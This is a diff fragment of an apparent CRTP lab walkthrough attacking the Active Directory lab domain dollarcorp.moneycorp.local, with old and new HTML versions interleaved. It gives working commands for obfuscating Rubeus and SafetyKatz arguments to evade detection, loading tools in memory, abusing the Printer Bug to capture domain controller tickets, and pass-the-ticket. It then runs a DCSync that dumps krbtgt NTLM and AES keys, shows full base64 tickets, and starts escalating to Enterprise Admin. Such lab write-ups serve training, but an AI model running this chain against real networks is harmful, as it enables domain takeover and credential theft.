href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" referrerpolicy="no-referrer" rel="stylesheet"/><pre class="code code-wrap" id="30c79e9a-d7c9-8018-88a6-c6cb6842dcbc"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">set "z=t"
+set "y=t"
+set "x=p"
+set "Pwn=%x%%y%%z%"</code></pre><p class="" id="30c79e9a-d7c9-8090-8734-dd20c55c1c39">
+</p><p class="" id="30c79e9a-d7c9-802f-8f02-dffa3bdb3417">After passing the encoded work ptt into the cmdlet we can now execute the Rubeus using the Base64 encoded hash and the ticket will be imported</p><link crossorigin="anonymous" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" referrerpolicy="no-referrer" rel="stylesheet"/><pre class="code code-wrap" id="30c79e9a-d7c9-8080-a9db-c781c330efd5"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /ticket: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</code></pre><a href="../../assets/crtp/Untitled 98.png"><img src="../../assets/crtp/Untitled 98.png"/></a><p class="" id="30c79e9a-d7c9-80f2-a1be-f151bf7917df">
+</p><p class="" id="30c79e9a-d7c9-8051-801f-d718b0b48ca0">Now if we do a klist to check the Cached Tickets we see that we do have the DCORP-DC$ cached Ticket.</p><a href="../../assets/crtp/Untitled 99.png"><img src="../../assets/crtp/Untitled 99.png"/></a><p class="" id="30c79e9a-d7c9-80ef-9ef2-d7d921bb9c3a">We can now abuse the DCSync Attack using SafetyKatz.</p><p class="" id="30c79e9a-d7c9-80cd-9414-d8d80ae03a0f">Encoding our word with ArgSplit.bat again.<br/><code>lsadump::dcsync</code></p><link crossorigin="anonymous" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" referrerpolicy="no-referrer" rel="stylesheet"/><pre class="code code-wrap" id="30c79e9a-d7c9-8096-bbea-d9e081469725"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">set "z=c"
+set "y=n"
+set "x=y"
+set "w=s"
+set "v=c"
+set "u=d"
+set "t=:"
+set "s=:"
+set "r=p"
+set "q=m"
+set "p=u"
+set "o=d"
+set "n=a"
+set "m=s"
+set "l=l"
+set "Pwn=%l%%m%%n%%o%%p%%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%"</code></pre><p class="" id="30c79e9a-d7c9-80dd-ba73-c128a71e1cea">
+</p><p class="" id="30c79e9a-d7c9-80b4-b0df-fd37e6c1fb02">Importing and executing SafetyKatz using PELoader.exe.</p><p class="" id="30c79e9a-d7c9-8035-8a3e-e6bd4e0dcb9c"><code>C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "%Pwn% /user:dcorp\krbtgt" "exit”</code></p><link crossorigin="anonymous" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" referrerpolicy="no-referrer" rel="stylesheet"/><pre class="code code-wrap" id="30c79e9a-d7c9-80bd-bd2c-cb945485be72"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">mimikatz(commandline) # lsadump::dcsync /user:dcorp\krbtgt
+[DC] 'dollarcorp.moneycorp.local' will be the domain
+[DC] 'dcorp-dc.dollarcorp.moneycorp.local' will be the DC server
+[DC] 'dcorp\krbtgt' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
 
-<p>Let’s now use Rubeus to get a session as appadmin user account and start enumerating if appadmin account is local admin in any machine in the domain.</p>
-<p><code>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:appadmin /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /opsec /createnetonly:C:\Windows32\cmd.exe /show /ptt</code></p>
-<p>now that we where able to get the session let’s just check the cached ticket to confirm that we do have the valid session.</p>
-<p><code>klist</code></p>
-<p>Ok now that we do have a session as <strong>appadmin</strong>user, let’s see if we do have local admin rights to what machines in the domain.</p>
-<p><code>. .\Find-PSRemotingLocalAdminAccess.ps1Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local</code></p>
-<p>The screenshot above, shows us that user appadmin user account has local admin access to <strong>dcorp-appsrv</strong>machine, that’s great, we will use this user.</p>
-<p>We can use multiple methods now to copy Rubeus to dcorp-appsrv to abuse Printer Bug!</p>
-<h1>Printer Bug - Rubeus</h1>
-<h3>Using PELoader.exe for args encoding.</h3>
-<p>Back to cmdlet, <code>PELoader.exe</code> is a tool used to load a payload into memory. So I’ll use PELoader.exe now to load and execute Rubeus.exe into memory. Pay attention that if we are using PELoader.exe to load payloads into memory only. It is also good that we execute <strong>ArgSplit.bat</strong> first to encode parameters of Rubeus, SafetyKatz and BetterSafetyKatz.</p>
-<p>Let’s start by copying PELoader into dcorp-appsrv machine.</p>
-<p>Once we have copied PELoader.exe into appsrv machine we can run Rubeus in listener mode. 
-Remember to run ArgSplit on the student VM to encode "monitor" and then run the generated commands in the winrs session on dcorp-appsrv</p>
-<p>Let’s access dcorp-appsrv.</p>
-<p><code>winrs -r:dcorp-appsrv cmd</code></p>
-<p>We should not forget to encode the word “<code>monitor</code>” using ArgSplit.bat file and copy again to the cmdlet.</p>
-<div class="highlight"><pre><span></span><code><span class="nb">set</span><span class="w"> </span><span class="s2">&quot;z=r&quot;</span>
-<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;y=o&quot;</span>
-<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;x=t&quot;</span>
-<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;w=i&quot;</span>
-<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;v=n&quot;</span>
-<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;u=o&quot;</span>
-<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;t=m&quot;</span>
-<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;Pwn=%t%%u%%v%%w%%x%%y%%z%&quot;</span>
-</code></pre></div>
+Object RDN           : krbtgt
 
-<p>We need to do a portforwarding  first.</p>
-<p><code>netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.51</code></p>
-<p><code>C:\Users\Public\Loader.exe -path ``http://127.0.0.1:8080/Rubeus.exe`` -args %Pwn% /targetuser:DCORP-DC$ /interval:5 /nowrap</code></p>
-<p>On our local machine, let’s use MS-RPRN.exe to force dcorp-dc$ machine running the Spooler service.</p>
-<p><code>C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local</code></p>
-<p>We wil see the following message above, but everything is ok. If we go to the target machine we will base64 encoded ticket.</p>
-<div class="highlight"><pre><span></span><code>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<span class="o">==</span>
-</code></pre></div>
+** SAM ACCOUNT **
 
-<p>Let’s copy the base64 encoded ticket and use it with Rubeus on our attacking machine. 
-We run the below command from an elevated shell(Administrator) as the SafetyKatz command that we will use for DCSync needs to be run from an elevated process.</p>
-<p>ArgSplit.bat</p>
-<p><code>ptt</code></p>
-<div class="highlight"><pre><span></span><code><span class="nb">set</span><span class="w"> </span><span class="s2">&quot;z=t&quot;</span>
-<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;y=t&quot;</span>
-<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;x=p&quot;</span>
-<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;Pwn=%x%%y%%z%&quot;</span>
-</code></pre></div>
+SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   :
+Password last change : 11/11/2022 10:59:41 PM
+Object Security ID   : S-1-5-21-719815819-3726368948-3917688648-502
+Object Relative ID   : 502
 
-<p>After passing the encoded work ptt into the cmdlet we can now execute the Rubeus using the Base64 encoded hash and the ticket will be imported</p>
-<div class="highlight"><pre><span></span><code><span class="n">C</span><span class="p">:\</span><span class="n">AD</span><span class="p">\</span><span class="n">Tools</span><span class="p">\</span><span class="n">Loader</span><span class="p">.</span><span class="n">exe</span> <span class="n">-path</span> <span class="n">C</span><span class="p">:\</span><span class="n">AD</span><span class="p">\</span><span class="n">Tools</span><span class="p">\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">-args</span> <span class="k">%</span><span class="n">Pwn</span><span class="p">%</span> <span class="p">/</span><span class="n">ticket</span><span class="p">:</span><span class="n">doIGRTCCBkGgAwIBBaEDAgEWooIFGjCCBRZhggUSMIIFDqADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKOCBLYwggSyoAMCARKhAwIBAqKCBKQEggSg</span><span class="p">/</span><span class="n">b8kfkN7iM0pL6xItTKlAeKn2EQYjC5nGKTvRVRAQgtAiibwEoLwea</span><span class="p">/</span><span class="n">mW</span><span class="p">/</span><span class="n">Yb8roD3c</span><span class="p">+</span><span class="n">Sez0T6IClAYOytK1hpDfb6CIfwQCIpwoNHFGFY32VJ3GAJPlRW7S7IVSXvMzV9d7E4djkqw9e0uNmWpJXJamCBZ3pqsDGhoY8SPMB13WXP</span><span class="p">/</span><span class="n">U0n</span><span class="p">/</span><span class="n">Pwjkufnnu</span><span class="p">/</span><span class="n">GkMItRcswfQ758sa</span><span class="p">+</span><span class="n">miJMjH4mLNs0OOeSczsDQ60qTLHdXke3MGIqJy7SaTkDmFjnFKJmMMwC9sLCjZLnJ31MHC6CB2RNDqPWNIMCrWCLLvxDxHcqq1</span><span class="p">+</span><span class="n">CD59LDArpiO78mGeoyfYMMGyeylLoy21EkFZ6TiM3FCUZDKoyMAg5kxzIp</span><span class="p">/</span><span class="n">lJAVNmnO2axN5172S7cr33uCsw64X</span><span class="p">/</span><span class="n">s07b84zJw2anSClBtirSis0udO7tOjQ1</span><span class="p">+</span><span class="n">KumAK3lFpdxR0b7cczYJI9</span><span class="p">+</span><span class="n">ki</span><span class="p">+</span><span class="n">VRoC0UiB</span><span class="p">+</span><span class="n">qx9CNbxyBOq6VDdkrpFqTjxJmrNAznDphi6v52t</span><span class="p">/</span><span class="n">7lhuxXbCm406rZrOv4fOg</span><span class="p">/</span><span class="n">uCKZmckac2h9gt6R7vANyQJxYZqJ9LD71g5IWzwalk0lmeA9M4yOqBRx7N3iObvFpHetdJ8WcE2nmUh0q0HysfKpipTyq9z6aJxFMCtFos6zPHtIb02WEMpeDJuYskqDdR1kBasneCJnJ3aEgO80tZvgqqmgQA4E7</span><span class="p">/</span><span class="n">67lxTYtczm1Xk</span><span class="p">+</span><span class="n">wcVtOME4pBXJ83</span><span class="p">+</span><span class="n">jewAAiAlYXmcGrnNcPW8Pg1iF3NWvTzObWdxJr8A8m</span><span class="p">+</span><span class="n">67Lw98A</span><span class="p">+</span><span class="n">3dFG5k5MkJtOChNRE0D2XV6KGq1NjoQwKauciPFOvBvctxVKOaPh1Q7gCKM</span><span class="p">+</span><span class="n">P7Iev4o8Wr1f4XDqfKbjxH17gAtUlHThoB7fBo30kTgAoYteD5KDLIm8W2BfeI9oVaPGzm68sw2</span><span class="p">/</span><span class="n">TQXGjm</span><span class="p">+</span><span class="n">ImxB4Zp28K5vu0XveHFPmaza295jsfs5GiNAUxpryUslBmjvFKTyuuKJdmeNzLi54PWN2BloNRzSIYXezQZseT</span><span class="p">/</span><span class="n">JByWMpSf</span><span class="p">+</span><span class="n">13Ulk8JiRUne1ecPjE</span><span class="p">/</span><span class="n">jbXnWyu</span><span class="p">+</span><span class="n">1Uun1WaRTrA1hEcis7XvaEEuUr6XH2QxZoT56yysxvShw4DQqCDYc3rOK</span><span class="p">/</span><span class="n">yi5YEf8PqFXpFVqi5GeoqalwvxwYs26WOF9HUppvNw3gDkp3RM7YIT4T3RJHtOtTgCOdvkKSvMtmDOuK</span><span class="p">+</span><span class="n">r</span><span class="p">+</span><span class="n">r1HwduLRpUV5zxq6a5cYhH94xOTOjxtbQ0Ymtvmll0C0Z9T</span><span class="p">+</span><span class="n">yELQ</span><span class="p">+</span><span class="n">VcqwcUgCRRvap2n7KBBV49nZVhKRVQM57qK5leY</span><span class="p">+</span><span class="n">5</span><span class="p">+</span><span class="n">XpXIEAazzLx9dqAru</span><span class="p">+</span><span class="n">ujrABWPeyt1nUuw5sTyn31HfRrlhEExPQ23Jy5LHOKC4drP41g</span><span class="p">/</span><span class="n">JBu7zhMKvIAhn2Lli9bq</span><span class="p">+/</span><span class="n">mD7mWNQ7jreJWr7nBqPpcoNoq5xBW8K7EYchcTsJZNbayNSbF</span><span class="p">/</span><span class="n">AZfQmtorEPMd3BVO1nqQqQ5f</span><span class="p">+</span><span class="n">udzzN3ASeIxN9kbONp</span><span class="p">+</span><span class="n">11SG</span><span class="p">+</span><span class="n">lhtzq7</span><span class="p">+</span><span class="n">ha5</span><span class="p">/</span><span class="n">weCJjVXAxn6rO44oya</span><span class="p">/</span><span class="n">dl</span><span class="p">+</span><span class="n">tODQjwG8RHkImqmGB5C6JM</span><span class="p">+</span><span class="n">NUm9Gq3F6v0GQGWOFCE0</span><span class="p">/</span><span class="n">iNsLCc</span><span class="p">/</span><span class="n">H8DdE8PpzSarX9TQbWzzZV0SrLHBr0</span><span class="p">/</span><span class="n">yfYyHFqjggEVMIIBEaADAgEAooIBCASCAQR9ggEAMIH9oIH6MIH3MIH0oCswKaADAgESoSIEIKlkgwiMOm</span><span class="p">/</span><span class="n">bCDsu</span><span class="p">/</span><span class="n">ZkubG1</span><span class="p">+</span><span class="n">zSfNlfpmccQ</span><span class="p">/</span><span class="n">P0a</span><span class="p">+</span><span class="n">8wGjoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMohYwFKADAgEBoQ0wCxsJRENPUlAtREMkowcDBQBgoQAApREYDzIwMjQwNjEwMTMzMzU0WqYRGA8yMDI0MDYxMDIzMzM1NFqnERgPMjAyNDA2MTcwNDAxNTNaqBwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMqS8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTA</span><span class="p">==</span>
-</code></pre></div>
+Credentials:
+  Hash NTLM: 4e9815869d2090ccfca61c1fe0d23986
+    ntlm- 0: 4e9815869d2090ccfca61c1fe0d23986
+    lm  - 0: ea03581a1268674a828bde6ab09db837
 
-<p>Now if we do a klist to check the Cached Tickets we see that we do have the DCORP-DC$ cached Ticket.</p>
-<p>We can now abuse the DCSync Attack using SafetyKatz.</p>
-<p>Encoding our word with ArgSplit.bat again.
-<code>lsadump::dcsync</code></p>
-<div class="highlight"><pre><span></span><code><span class="nb">set </span><span class="s2">&quot;z=c&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;y=n&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;x=y&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;w=s&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;v=c&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;u=d&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;t=:&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;s=:&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;r=p&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;q=m&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;p=u&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;o=d&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;n=a&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;m=s&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;l=l&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;Pwn=%l%%m%%n%%o%%p%%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%&quot;</span>
-</code></pre></div>
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 6d4cc4edd46d8c3d3e59250c91eac2bd
 
-<p>Importing and executing SafetyKatz using PELoader.exe.</p>
-<p><code>C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "%Pwn% /user:dcorp\krbtgt" "exit”</code></p>
-<div class="highlight"><pre><span></span><code><span class="n">mimikatz</span><span class="p">(</span><span class="n">commandline</span><span class="p">)</span> <span class="c"># lsadump::dcsync /user:dcorp\krbtgt</span>
-<span class="no">[DC]</span> <span class="s1">&#39;dollarcorp.moneycorp.local&#39;</span> <span class="n">will</span> <span class="n">be</span> <span class="n">the</span> <span class="n">domain</span>
-<span class="no">[DC]</span> <span class="s1">&#39;dcorp-dc.dollarcorp.moneycorp.local&#39;</span> <span class="n">will</span> <span class="n">be</span> <span class="n">the</span> <span class="n">DC</span> <span class="n">server</span>
-<span class="no">[DC]</span> <span class="s1">&#39;dcorp\krbtgt&#39;</span> <span class="n">will</span> <span class="n">be</span> <span class="n">the</span> <span class="n">user</span> <span class="n">account</span>
-<span class="no">[rpc]</span> <span class="n">Service</span>  <span class="p">:</span> <span class="n">ldap</span>
-<span class="no">[rpc]</span> <span class="n">AuthnSvc</span> <span class="p">:</span> <span class="n">GSS_NEGOTIATE</span> <span class="p">(</span><span class="n">9</span><span class="p">)</span>
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
+      aes128_hmac       (4096) : e74fa5a9aa05b2c0b2d196e226d8820e
+      des_cbc_md5       (4096) : 150ea2e934ab6b80
 
-<span class="n">Object</span> <span class="n">RDN</span>           <span class="p">:</span> <span class="n">krbtgt</span>
+* Primary:Kerberos *
+    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
+    Credentials
+      des_cbc_md5       : 150ea2e934ab6b80
 
-<span class="p">**</span> <span class="n">SAM</span> <span class="n">ACCOUNT</span> <span class="p">**</span>
+* Packages *
+    NTLM-Strong-NTOWF</code></pre><p class="" id="30c79e9a-d7c9-80da-aa26-e0d0060721cd">
+</p><h1 class="" id="30c79e9a-d7c9-8066-aed4-de8bcbc10b3a">Escalation to Enterprise Admins</h1><p class="" id="30c79e9a-d7c9-8094-b1e9-c2b08619890d">Assuming that we were able to compromise a Domain Controller, we are Domain Admin and we want to get Enterprise Admin privileges, we need to force authentication from mcorp-dc. <br/>Run the below command to listen for MDCORP$ tickets on dcorp-appsrv</p><p class="" id="30c79e9a-d7c9-8083-aed8-ca6e4f21c30e">Let’s access dcorp-appsrv.<br/><code>winrs -r:dcorp-appsrv cmd</code></p><p class="" id="30c79e9a-d7c9-807f-99f0-e28f06d0eb38">
+</p><p class="" id="30c79e9a-d7c9-80ed-b470-e5a87d9cd7ca">
+</p><p class="" id="30c79e9a-d7c9-800b-b77e-e63b48ea04a2">Let’s do a portforwarding first</p><p class="" id="30c79e9a-d7c9-80ef-a6dc-e0c412f5d5e8"><code>netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.51</code></p><p class="" id="30c79e9a-d7c9-80ff-a546-dd8d421c49eb">
+</p><p class="" id="30c79e9a-d7c9-80a3-9ec9-cd499c6d6a36">NOW…We should not forget to encode the word “<code><strong>monitor</strong></code>” using ArgSplit.bat file and copy again to the cmdlet.</p><link crossorigin="anonymous" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" referrerpolicy="no-referrer" rel="stylesheet"/><pre class="code code-wrap" id="30c79e9a-d7c9-80fb-84e2-c1c16c64d9da"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">set "z=r"
+set "y=o"
+set "x=t"
+set "w=i"
+set "v=n"
+set "u=o"
+set "t=m"
+set "Pwn=%t%%u%%v%%w%%x%%y%%z%"</code></pre><p class="" id="30c79e9a-d7c9-8058-9edd-fc0c3abd8b42">
+</p><p class="" id="30c79e9a-d7c9-804e-9b76-e5ce8f13d2fb"><code>C:\Users\Public\Loader.exe -path </code><code><a href="http://127.0.0.1:8080/Rubeus.exe">http://127.0.0.1:8080/Rubeus.exe</a></code><code> -args %Pwn% /targetuser:MCORP-DC$ /interval:5 /nowrap</code></p><a href="../../assets/crtp/Untitled 100.png"><img src="../../assets/crtp/Untitled 100.png"/></a><p class="" id="30c79e9a-d7c9-803b-a2d5-d75aa061e8c2">
